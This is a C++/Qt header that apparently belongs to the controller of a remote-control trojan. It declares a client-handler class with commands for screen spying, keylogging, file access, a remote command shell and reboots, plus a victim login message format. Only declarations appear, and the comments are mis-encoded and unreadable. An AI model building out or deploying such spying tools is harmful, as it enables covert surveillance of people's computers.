#pragma once


#ifndef ZEROCLIENT_H
#define ZEROCLIENT_H
#pragma execution_character_set("utf-8")
#include <QObject>
#include "tcpsocket.h"
#include <QTimer>
#include <QTcpSocket>
#include <QHostAddress>

class ZeroClient : public QObject
{
    Q_OBJECT
public:
    explicit ZeroClient(QTcpSocket* sock, QObject* parent = 0);

    // �������ͻ��˷��͵�ָ��(���������Ҫ��Ҳ���������Լ���ָ��)
    const QByteArray CmdScreenSpy = "SCREEN_SPY";
    const QByteArray CmdKeyboardSpy = "KEYBOARD_SPY";
    const QByteArray CmdFileSpy = "FILE_SPY";
    const QByteArray CmdCmdSpy = "CMD_SPY";
    const QByteArray CmdSendMessage = "SEND_MESSAGE";
    const QByteArray CmdReboot = "REBOOT";
    const QByteArray CmdQuit = "QUIT";

    // �ͻ��������˷��͵�ָ��(���������Ҫ��Ҳ���������Լ���ָ��)
    const QByteArray CmdLogin = "LOGIN";

    // �ָ���źͽ������ţ������������:LOGIN<�ָ��>SYSTEM<�ָ��>Windows 7<�ָ��>USER_NAME<�ָ��>sumkee911<��������>
    const QByteArray CmdSplit = ";";
    const QByteArray CmdEnd = "\r\n";

    // �Ͽ��ͻ�
    void closeAndDelete();

    // ����ID
    void setId(int id) {
        mId = id;
    }

    
private:
    TcpSocket* mSock;       // ��ͻ�ͨѶ��socket
    QTimer* mLoginTimeout;  // �����жϿͻ��Ƿ�ʱ����
    int mId;                // ��ʼֵ��-1, ��������ZeroServer������ڻ����0��ID����

    // ����ָ��
    // @cmd: ָ��
    // @args: ����
    void processCommand(QByteArray& cmd, QByteArray& args);

    // �ֽ�ָ��Ĳ��������ع�ϣ��
    QHash<QByteArray, QByteArray> parseArgs(QByteArray& args);

    // ����ָ����Ӧ�ĺ���
    void doLogin(QHash<QByteArray, QByteArray>& args);

signals:
    // ����͵ǳ��ź�
    // @client: �Լ�
    void login(ZeroClient* client, QString userName, QString ip, int port, QString system);
    void logout(int id);

public slots:
    // ����ͻ����ƶ�ʱ���ڻ�û�е����������
    void clientLoginTimeout();

    // �ͻ��Ͽ�
    void disconnected();

    // ����������
    void newData();
};

#endif // ZEROCLIENT_H